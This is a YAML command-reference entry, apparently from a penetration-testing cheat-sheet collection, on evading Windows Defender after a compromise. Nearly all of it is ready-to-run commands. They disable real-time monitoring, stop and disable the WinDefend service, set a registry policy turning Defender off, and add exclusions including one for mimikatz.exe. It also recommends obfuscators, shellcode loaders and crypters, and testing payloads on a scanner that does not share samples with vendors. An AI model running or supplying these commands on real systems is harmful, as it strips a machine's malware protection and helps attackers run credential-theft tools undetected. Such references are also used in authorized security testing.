---
description: |
  Windows Defender evasion — check status, disable real-time protection, add exclusions, and obfuscation techniques for bypassing AV detection.
command: |
  # Check Windows Defender status
  Get-MpComputerStatus
  Get-MpPreference | select -ExpandProperty ExclusionPath

  # Disable real-time protection (requires admin)
  Set-MpPreference -DisableRealtimeMonitoring $true

  # Add exclusion paths (requires admin)
  Add-MpExclusion -Path "C:\Temp"
  Add-MpExclusion -Path "C:\Users\Public"

  # Add exclusion for specific process
  Add-MpExclusion -Process "mimikatz.exe"

  # Disable via registry (requires admin + may need reboot)
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

  # Disable via sc (requires admin)
  sc stop WinDefend
  sc config WinDefend start= disabled

  # If can't disable, use obfuscation
  # Invoke-Obfuscation for PowerShell scripts
  # Use donut/ScareCrow for shellcode loaders
  # Use crypter tools for PE files

  # Check if detected before running
  # Upload to antiscan.me (not VirusTotal — VT shares with vendors)
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Windows
services: []
techniques:
  - Defense_Evasion
references:
  - https://github.com/optiv/ScareCrow
  - https://github.com/danielbohannon/Invoke-Obfuscation
---
